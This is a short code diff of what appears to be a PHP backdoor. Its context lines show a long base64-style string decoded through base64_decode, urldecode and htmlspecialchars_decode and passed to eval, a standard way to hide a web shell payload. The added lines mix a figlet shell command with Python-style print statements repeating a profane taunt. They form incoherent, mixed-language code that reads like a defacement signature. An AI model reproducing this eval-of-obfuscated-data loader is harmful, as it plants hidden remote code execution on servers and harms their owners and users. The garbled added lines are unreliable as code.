@@ -15,3 +15,10 @@ $U7TiM4T3_H4x0R = "xSs/5dg9+B3xHo7WZU05NqR966J1wvtxbkqJJdzUqi/9sEEiily7wah9N6e+T
 eval(htmlspecialchars_decode(urldecode(base64_decode($U7TiM4T3))));
 exit;
 ?>
+figlet Y4H1K0
+print ("Suprise mother fucker ")
+
+print ("Suprise mother fucker ")
+print ("Suprise mother fucker ")
+print ("Suprise mother fucker ")
+print ("Suprise mother fucker ")
